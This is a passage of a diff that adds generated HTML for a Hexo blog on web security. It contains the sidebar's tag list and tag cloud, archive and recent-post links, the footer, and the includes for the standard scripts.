href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
